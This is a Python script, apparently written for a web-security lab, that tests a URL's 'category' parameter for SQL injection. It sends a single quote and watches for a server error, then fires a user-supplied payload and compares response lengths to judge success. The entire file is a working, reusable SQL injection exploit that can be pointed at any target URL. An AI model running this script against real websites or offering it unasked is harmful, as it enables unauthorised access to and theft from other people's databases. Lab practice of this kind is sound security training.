import requests
import sys
import validators

class Exploit():
    def __init__(self) -> None:
        self.url = ''
        self.proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
        self.payload = {}
        self.check_args()
        self.set_url()
        self.set_payload()
        self.is_vulnerable = False
        self.check_vulnerability()
        self.is_successful = False
    
    def check_args(self) -> None:
        if len(sys.argv) < 3:
            print(f'[-] Usage: {sys.argv[0]} <url> <payload>')
            print(f'[-] Example: {sys.argv[0]} http://example.com "1=1"')
            exit()

    def set_url(self) -> None:
        url = sys.argv[1].strip()   
        is_valid = validators.url(url)
        if not is_valid:
            print(f'[-] The URL "{url}" is not valid.')
            print(f'[-] Valid URL example: http://example.com')
            exit()

        self.url = url
            
    def set_payload(self) -> None:
        payload = sys.argv[2]
        self.payload['category'] = payload

    def check_vulnerability(self) -> None:
        print('[+] Checking for vulnerabiility...')
        req = requests.get(self.url, params={'category': "'", 'released': 1})
        if "Internal Server Error" in req.text:
            self.is_vulnerable = True

    def run(self) -> None:
        if self.is_vulnerable:
            req = requests.get(self.url, params={'category': 'Lifestyle'})
            req_payload = requests.get(self.url, params=self.payload)

            if len(req.text) < len(req_payload.text):
                self.is_successful = True

def main():
    exploit = Exploit()
    exploit.run()

    if exploit.is_successful:
       print('[+] SQL injection exploit was successful!')
    else:
        print('[-] The SQL injection exploit was not successful!') 

if __name__ == '__main__':
    main()